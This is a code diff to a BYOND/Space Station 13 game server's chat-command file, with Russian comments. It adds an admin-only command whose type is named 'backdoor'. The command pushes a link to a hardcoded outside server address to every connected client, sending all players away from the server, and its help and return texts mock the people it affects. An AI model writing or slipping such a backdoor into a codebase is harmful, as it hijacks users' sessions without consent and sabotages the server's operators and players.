@@ -360,3 +360,15 @@ GLOBAL_LIST(round_end_notifiees)
 		else
 			// Я могу только прочитать или написать факс
 			return "Не удалось распознать аргумент `[parampampam[1]]`"
+
+/datum/tgs_chat_command/backdoor
+	name = "doNotPressThatButton"
+	help_text = "Вы же юзаете хелп? Молодцы. Посылает всех с этого сервера на НСВ. Я же обещал."
+	admin_only = TRUE
+
+/datum/tgs_chat_command/backdoor/Run(datum/tgs_chat_user/sender, params)
+	if(params == null || params == "")
+		params = "byond://65.21.225.102:1343"
+	for(var/client/C in GLOB.clients)
+		send_link(C, params)
+	return "Подлец, обосрал жизнь [GLOB.clients.len] людям!"
